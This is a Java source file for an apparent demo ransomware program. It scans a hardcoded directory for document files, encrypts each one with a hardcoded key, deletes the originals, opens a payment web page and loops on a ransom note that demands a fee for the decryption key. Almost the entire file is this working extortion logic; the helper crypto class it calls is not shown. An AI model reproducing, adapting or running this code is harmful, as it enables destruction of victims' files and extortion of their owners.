


import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.lang.reflect.Field;
import java.io.FilenameFilter;
import java.util.Scanner;
import java.util.List;
import java.nio.file.*;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.awt.Desktop;
import java.net.URI;
import java.net.URISyntaxException;


public class Main {

        public static String CodeKey="12345678";
        public static String basedir="C:\\Users\\dongy\\Desktop\\test\\";
        
        public static void main(String[] args) throws NoSuchAlgorithmException, IOException, FileNotFoundException, IllegalBlockSizeException, BadPaddingException, NoSuchPaddingException, InvalidKeyException{
            
            FireUP();
            
           while(true)
           Recover();
        }
        
        
        public static void FireUP() throws NoSuchAlgorithmException, IOException, FileNotFoundException, IllegalBlockSizeException, BadPaddingException, NoSuchPaddingException, InvalidKeyException{
            File file= new File(basedir);
            
            File[] files=file.listFiles(new FilenameFilter(){

                public boolean accept(File dir, String name){
                   
                    if(name.toLowerCase().endsWith(".txt") || name.toLowerCase().endsWith(".pptx") || name.toLowerCase().endsWith(".hwp") || name.toLowerCase().endsWith(".docx") || name.toLowerCase().endsWith(".doc") || name.toLowerCase().endsWith(".zip")
                            || name.toLowerCase().endsWith(".pdf") || name.toLowerCase().endsWith(".ppt")){
                        return true;
                    }
                    
                    else{
                        return false;
                    }
                }
                
            });
            for(File f:files){
                System.out.println(f.getName());
                
                Encrypt(basedir+f.getName());
            }
        }
        
        
    public static void Encrypt(String targetFilePath) throws NoSuchAlgorithmException, IOException, FileNotFoundException, IllegalBlockSizeException, BadPaddingException, NoSuchPaddingException, InvalidKeyException{
        File inputFile = new File(targetFilePath);
       
        File encryptedFile= new File(targetFilePath+".encrypt");

        
        try{
            CrypTool.encrypt(CodeKey,inputFile,encryptedFile);
            System.out.println(inputFile+" is encrypted now!");
            inputFile.delete();
        }
        
    catch(CryptoException ex){
    System.out.println(ex.getMessage());
    ex.printStackTrace();
}
    }
    
    public static void Decrypt(String targetFilePath) throws NoSuchAlgorithmException, IOException, FileNotFoundException, IllegalBlockSizeException, BadPaddingException, NoSuchPaddingException, InvalidKeyException{
        File inputFile = new File(targetFilePath);
        File decryptedFile= new File(targetFilePath+".decrypt");
        try{
            CrypTool.decrypt(CodeKey,inputFile,decryptedFile);
            System.out.println(inputFile+" is decrypted now!");
            
        }
    
    catch(CryptoException ex){
    System.out.println(ex.getMessage());
    ex.printStackTrace();
}
    }
public static void Recover() throws NoSuchAlgorithmException, IllegalBlockSizeException, IOException, FileNotFoundException, BadPaddingException, InvalidKeyException, NoSuchPaddingException{
        Scanner myObj=new Scanner(System.in);
        String urlLink = "https://kairos-hk.github.io/jran_website/index.html";
        try {
			Desktop.getDesktop().browse(new URI(urlLink));
		} catch (IOException e) {
			e.printStackTrace();
		} catch (URISyntaxException e) {
			e.printStackTrace();
		}
        
        System.out.println("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$");
        System.out.println("     _.--\"\"--._            \n"
        		+ "    /  _    _  \\                   < Attention!! >\n"
        		+ " _  ( (_\\  /_) )  _         All your files are encrypted!\n"
        		+ "{ \\._\\   /\\   /_./ }       \n"
        		+ "/_\"=-.}______{.-=\"_\\      If you want to recover your file,\n"
        		+ " _  _.=(\"\"\"\")=._  _    Buy the decypted key from payment page!\n"
        		+ "(_'\"_.-\"`~~`\"-._\"'_)      \n"
        		+ " {_\"            \"_}        \n");
        
        System.out.println("HEllo?");
        System.out.println("Your files have all been encrypted using a heavy encryption called \"AES\".");
        System.out.println("You will not be able to access the files unless you have been provided thr PASSCODE.");
        System.out.println("This unfortunate event does have a solution By paying a small fee.");
        System.out.println("you csn get all of your files back as you will be sent the passcode.\n");
        System.out.println("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n");
        System.out.println("If you decrypt your file, Enter the decrypt key!");
        System.out.println("Enter Key to recover your files... : ");
        
        String code=myObj.nextLine();
       if("exit".equals(code)){
           System.exit(0);
       }
       else{
        if(code.equals(CodeKey)){
        
        System.out.println("Working......");
        File file=new File(basedir);
        System.out.println(file);
            File[] files=file.listFiles(new FilenameFilter(){

            
        @Override
        public boolean accept(File dir, String name){
        
            System.out.println(name);
            
        if(name.toLowerCase().endsWith(".encrypt")){
            return true;

        }
        else{
            
               return false;
        }
        
        }



});
for(File f:files){

    System.out.println(f.getName());
        Decrypt(basedir+f.getName());
        f.delete();
        System.out.println("Correct Decrypt Key! Decrypt is done.");
        System.exit(0);

        
}
}
        else
    System.out.println("Wrong KEY!!!!");
}

        
}
}
